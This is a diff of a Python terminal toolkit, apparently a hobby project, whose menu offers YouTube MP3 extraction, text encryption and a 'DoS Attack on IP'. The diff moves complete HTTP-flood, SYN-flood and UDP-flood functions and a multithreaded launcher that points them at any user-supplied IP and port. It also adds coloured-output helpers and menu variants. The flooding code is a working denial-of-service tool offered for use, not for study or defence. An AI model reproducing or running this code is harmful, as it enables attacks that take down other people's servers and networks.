@@ -14,79 +14,24 @@ numlist = ['1','2','3','4','5','6','7','8','9','0']
 usingThreading = True
 hackerMode = False
 insettings = False
+
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/90.0",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
 ]
 
-def encrypt_text(text, key):
-    key = base64.urlsafe_b64encode(key.ljust(32, 'X').encode())
-    cipher = Fernet(key)
-    encrypted_text = cipher.encrypt(text.encode())
-    return base64.urlsafe_b64encode(encrypted_text).decode()
-
-def decrypt_text(encrypted_text_str, key):
-    encrypted_text = base64.urlsafe_b64decode(encrypted_text_str.encode())
-    key = base64.urlsafe_b64encode(key.ljust(32, 'X').encode())
-    cipher = Fernet(key)
-    return cipher.decrypt(encrypted_text).decode()
-
-def http_flood(target_ip, target_port, time_limit):
-    start_time = time.time()
-    while time.time() - start_time < time_limit:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((target_ip, target_port))
-            user_agent = random.choice(USER_AGENTS)
-            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
-            s.send(request.encode())
-            s.close()
-        except:
-            pass
-
-def syn_flood(target_ip, target_port, time_limit):
-    start_time = time.time()
-    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
-    while time.time() - start_time < time_limit:
-        try:
-            send(packet, verbose=0)
-        except:
-            pass
-
-def udp_flood(target_ip, target_port, time_limit):
-    start_time = time.time()
-    while time.time() - start_time < time_limit:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.sendto(random._urandom(2048), (target_ip, target_port))
-            s.close()
-        except:
-            pass
-
-def start_attack(target_ip, target_port, time_limit, threads, attack_type):
-    thread_list = []
-    attack_methods = {
-        "http": http_flood,
-        "syn": syn_flood,
-        "udp": udp_flood
-    }
-    attack_function = attack_methods.get(attack_type, http_flood)
-    for _ in range(threads):
-        thread = threading.Thread(target=attack_function, args=(target_ip, target_port, time_limit))
-        thread.daemon = True
-        thread.start()
-        thread_list.append(thread)
-    for thread in thread_list:
-        thread.join()
-
-def clear_terminal():
-    if os.name == "nt":
-        os.system("cls")
+def hprint(text):
+    if hackerMode == False:
+        print(text)
     else:
-        os.system("clear")
+        print(f"\033[32m{text}\033[0m")
 
+def hinput(text):
+    if hackerMode == False:
+        input(text)
+    else:
+        input(f"\033[32m{text}\033[0m")
 
 def print_title():
     if(os.name == "nt"):
@@ -159,6 +104,48 @@ def print_features():
 ║     
 ╚═ 8. Exit
 \033[0m""")
+    elif os.name != "nt" and hackerMode == False:
+        print("""
+▆▅▃▂▁𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬▁▂▃▅▆
+╔═════════════════┃
+║
+╠═ 1. Extract MP3 from YouTube link
+║
+╠═ 2. DoS Attack on IP
+║
+╠═ 3. Encrypt a text file
+║
+╠═ 4. Decrypt the encrypted file
+║
+╠═ 5. Compress a file (HUFFMAN - NOT IMPLEMENTED YET)
+║
+╠═ 6. Decompress a file (HUFFMAN - NOT IMPLEMENTED YET)
+║
+╠═ 7. Settings
+║     
+╚═ 8. Exit
+""")
+    elif os.name != "nt" and hackerMode == True:
+        print("""\033[32m
+▆▅▃▂▁𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬▁▂▃▅▆
+╔═════════════════┃
+║
+╠═ 1. Extract MP3 from YouTube link
+║
+╠═ 2. DoS Attack on IP
+║
+╠═ 3. Encrypt a text file
+║
+╠═ 4. Decrypt the encrypted file
+║
+╠═ 5. Compress a file (HUFFMAN - NOT IMPLEMENTED YET)
+║
+╠═ 6. Decompress a file (HUFFMAN - NOT IMPLEMENTED YET)
+║
+╠═ 7. Settings
+║     
+╚═ 8. Exit
+\033[0m""")
 
         
 def print_settings():
@@ -184,6 +171,73 @@ def print_settings():
 ║
 ╚═ 3. Exit settings
 \033[0m""")
+
+def encrypt_text(text, key):
+    key = base64.urlsafe_b64encode(key.ljust(32, 'X').encode())
+    cipher = Fernet(key)
+    encrypted_text = cipher.encrypt(text.encode())
+    return base64.urlsafe_b64encode(encrypted_text).decode()
+
+def decrypt_text(encrypted_text_str, key):
+    encrypted_text = base64.urlsafe_b64decode(encrypted_text_str.encode())
+    key = base64.urlsafe_b64encode(key.ljust(32, 'X').encode())
+    cipher = Fernet(key)
+    return cipher.decrypt(encrypted_text).decode()
+
+def http_flood(target_ip, target_port, time_limit):
+    start_time = time.time()
+    while time.time() - start_time < time_limit:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            s.connect((target_ip, target_port))
+            user_agent = random.choice(USER_AGENTS)
+            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
+            s.send(request.encode())
+            s.close()
+        except:
+            pass
+
+def syn_flood(target_ip, target_port, time_limit):
+    start_time = time.time()
+    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
+    while time.time() - start_time < time_limit:
+        try:
+            send(packet, verbose=0)
+        except:
+            pass
+
+def udp_flood(target_ip, target_port, time_limit):
+    start_time = time.time()
+    while time.time() - start_time < time_limit:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(random._urandom(2048), (target_ip, target_port))
+            s.close()
+        except:
+            pass
+
+def start_attack(target_ip, target_port, time_limit, threads, attack_type):
+    thread_list = []
+    attack_methods = {
+        "http": http_flood,
+        "syn": syn_flood,
+        "udp": udp_flood
+    }
+    attack_function = attack_methods.get(attack_type, http_flood)
+    for _ in range(threads):
+        thread = threading.Thread(target=attack_function, args=(target_ip, target_port, time_limit))
+        thread.daemon = True
+        thread.start()
+        thread_list.append(thread)
+    for thread in thread_list:
+        thread.join()
+
+def clear_terminal():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
 
 clear_terminal()
 
